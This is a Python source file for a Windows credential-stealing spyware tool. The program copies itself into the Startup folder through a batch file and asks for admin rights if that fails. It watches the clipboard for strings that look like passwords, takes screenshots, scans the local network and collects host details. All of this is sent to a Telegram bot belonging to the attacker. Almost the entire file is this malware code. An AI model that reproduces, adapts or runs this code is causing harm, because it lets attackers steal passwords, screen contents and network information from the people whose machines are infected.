import ctypes
from collections import OrderedDict
from ctypes import windll
import getpass as gp
from requests import get
import sys
from time import sleep
from datetime import datetime
import pyperclip
import regex as re
import requests
import glob
import time
import os
import pyautogui
import socket
from getmac import get_mac_address as gma
import ipaddress
from mac_vendor_lookup import MacLookup
import kthread
import subprocess

MY_TIME = datetime.now().strftime('%H.%M.%S_%Y.%m.%d')
# telegram token and id
TOKEN = r'some_token'
ADMIN_ID = r'some_id'
USER_NAME = gp.getuser()
DOWNLOADS_PATH = f'C:/Users/{USER_NAME}/Downloads/security_check.exe'
STARTUP_PATH = f'C:/Users/{USER_NAME}/AppData/Roaming/Microsoft/' \
               f'Windows/Start Menu/Programs/Startup/'
LOG_PATH = f'C:/Users/{USER_NAME}/Downloads/intercepted_passwords.txt'
SCREEN_PATH = f'C:/Users/{USER_NAME}/Downloads/'
# temporally variable for clipboard
CLIPBOARD_STRING = ''
# interval to send a log
interval = 60
# time start script
start_time = time.time()
# directory for screenshots
directory = 'screen_log'
# path for screenshots directory
screen_dir = os.path.join(SCREEN_PATH, directory)
# list for screenshots
screen_list = []


# Check startup
def check_startup():
    start_up = []
    start_file = 'open.bat'
    for apps in glob.glob(STARTUP_PATH):
        start_up.append(apps.split('\\')[-1])
        if start_file in start_up:
            return True
        else:
            return False


# check admin rights
def check_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


# create bat
def create_bat():
    if check_startup():
        pass
    elif not check_startup():
        try:
            with open(STARTUP_PATH + '\\' + 'open.bat', 'w+') as bat_file:
                bat_file.write(f'start ""  {DOWNLOADS_PATH}')
        except:
            # Re-run the program with admin rights
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)


# Clean clipboard before start interception
def clipboard_cleaner():
    if windll.user32.OpenClipboard(None):
        windll.user32.EmptyClipboard()
        windll.user32.CloseClipboard()


# find digits and letters in string:
def interceptor_passwords(a_string):
    rx = re.compile(r'(?=\d++[A-Za-z]+[\w@]+|[a-zA-Z]++[\w@]+)[\w@]{2,}')
    return '\n'.join(rx.findall(a_string))


# find public IP
def ip_finder():
    ip = get('https://api.ipify.org').content.decode('utf8')
    try:
        return '{}'.format(ip)
    except:
        return 'Can not find ip'


# variable for public IP
public_ip = ip_finder()

# variable for hostname
hostname = socket.gethostname()

# variable for mac address host machine
mac_hostname = gma()
local_macs = gma()


# find local IP
def get_local_ip():
    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        # Use Google Public DNS server to find IP
        sock.connect(('8.8.8.8', 80))
        return sock.getsockname()[0]
    except socket.error:
        try:
            return socket.gethostbyname(socket.gethostname())
        except socket.gaierror:
            return '127.0.0.1'
    finally:
        sock.close()


# function to get all IPS in LAN
def get_ips():
    # IP address without last octet
    ip_start = local_ip[:10]
    # dict for range IP addresses
    ip_addresses = {}

    # function for ping all IPS in LAN
    def ping(address):
        try:
            # send one package
            output_cap = subprocess.run([f'ping', address, '-n', '1'], capture_output=True)
            ip_addresses[address] = output_cap
        except:
            pass

    # create threads
    t = [kthread.KThread(target=ping, name=f"get_ips{ip_end}", args=(f'{ip_start}{ip_end}',)) for ip_end in
         range(255)]
    # start 255 threads
    [kk.start() for kk in t]
    while len(ip_addresses) < 255:
        # list for result IPS
        all_devices = []
        for key, item in ip_addresses.items():
            # check is connection successful
            if 'TTL' in item.stdout.decode('utf-8', errors='ignore'):
                # add IP to list
                all_devices.append(key)
        return all_devices


def arp_scan():
    local_dev = open(f'C:/Users/{USER_NAME}/Downloads/local_devices.txt', 'a')
    all_local_ip = get_ips()
    for i in all_local_ip:
        try_mac = gma(ip=i, network_request=True, interface="wlan0")
        if try_mac is None:
            try_mac = 'Undefined'
        mac = try_mac
        local_hostnames = socket.getfqdn(i)
        try:
            # variable for check vendor of mac
            mac_vendor = MacLookup().lookup(mac)
        except:
            mac_vendor = 'Undefined'
        print(f'IP: {i}  MAC: {mac}  Vendor: {mac_vendor}  Name: {local_hostnames} Public IP: {public_ip}  '
              f'Country: {country_finder(public_ip)}', file=local_dev)
    local_dev.close()
    # call function to clean double strings in log
    clean_result()
    # send logs scan local network to telegram
    file_dev = {
        'document': open(f'C:/Users/{USER_NAME}/Downloads/local_devices.txt', 'rb')}
    requests.post(f'https://api.telegram.org/bot{TOKEN}/sendDocument?chat_id={ADMIN_ID}',
                  files=file_dev)


# variable for local IP
local_ip = get_local_ip()

# variable for subnet mask in local network
net_mask = ipaddress.IPv4Network(local_ip).netmask


# find country of public IP
def country_finder(ip):
    endpoint = f'https://ipinfo.io/{ip}/json'
    response = requests.get(endpoint, verify=True)
    if response.status_code != 200:
        return 'cannot find country'
    data = response.json()
    return data['country']


# variable for all information about host machine
host_info = f'name: {hostname} local IP: {local_ip} subnet mask: {net_mask} mac: {mac_hostname} public IP: ' \
            f'{public_ip} country: {country_finder(public_ip)} '


# create directory for screenshots
def create_dir():
    try:
        os.mkdir(screen_dir)
    except FileExistsError:
        pass


# make screenshot
def screen_shot():
    pyautogui.screenshot().save(f'{screen_dir}/{MY_TIME}.png')


# function for send screenshots to telegram
def send_screen():
    os.chdir(f'{screen_dir}')
    for screen in glob.iglob('*.png'):
        screen_list.append(screen)
    for screen_shots in screen_list:
        for_send = screen_shots
        files = {'photo': open(f'{screen_dir}/{for_send}', 'rb')}
        requests.post(f'https://api.telegram.org/bot{TOKEN}/sendPhoto?chat_id={ADMIN_ID}', files=files)


# function for send log to telegram with time interval
def log_sender():
    # timer for send logs
    global start_time
    if int(time.time() - start_time) >= interval:
        # send log passwords to Telegram
        files = {
            'document': open(f'C:/Users/{USER_NAME}/Downloads/intercepted_passwords.txt', 'rb')}
        requests.post(f'https://api.telegram.org/bot{TOKEN}/sendDocument?chat_id={ADMIN_ID}',
                      files=files)

        # call ARP scanner local network of target machine
        arp_scan()

        # reset start time
        start_time = time.time()


# clean logs in screenshot folder and list of screenshots
def clean_logs():
    os.chdir(f'{screen_dir}')
    clean_log = os.listdir()
    for _ in clean_log:
        os.remove(_)
        screen_list.clear()


# clean logs from double strings
def clean_result():
    dirt_file = f'C:/Users/{USER_NAME}/Downloads/local_devices.txt'
    with open(dirt_file, 'r', encoding='utf-8') as file:
        uniq = OrderedDict.fromkeys(file)
    with open(dirt_file, 'w', encoding='utf-8') as file:
        file.writelines(uniq)
        file.close()

# Intercept pass,  write to file and send text log to Telegram
def start_loop():
    # string for intercept pass
    pass_string = ''
    global CLIPBOARD_STRING, start_time
    while True:
        # start log send timer
        log_sender()
        # clean screenshots folder and list
        clean_logs()
        # assign string to clipboard:
        CLIPBOARD_STRING = pyperclip.paste()
        # create / open file for save passwords:
        f = open(f'C:/Users/{USER_NAME}/Downloads/intercepted_passwords.txt', 'a')
        # check password in list and check is link or not:
        for _ in interceptor_passwords(CLIPBOARD_STRING):
            if CLIPBOARD_STRING != pass_string and 'http' not in CLIPBOARD_STRING:
                # validate pass
                caught_pass = interceptor_passwords(CLIPBOARD_STRING)
                if caught_pass is not None:
                    # add intercepted pass and used time and ip to doc:
                    print(caught_pass, 'used', MY_TIME, host_info, file=f)
                    # make screenshot
                    screen_shot()
                    # send screenshot to telegram
                    send_screen()
                    f.close()
            # reassign clipboard to string
            pass_string = CLIPBOARD_STRING
        sleep(1)


def main():
    check_startup()
    check_admin()
    create_bat()
    clipboard_cleaner()
    create_dir()
    start_loop()


if __name__ == '__main__':
    main()
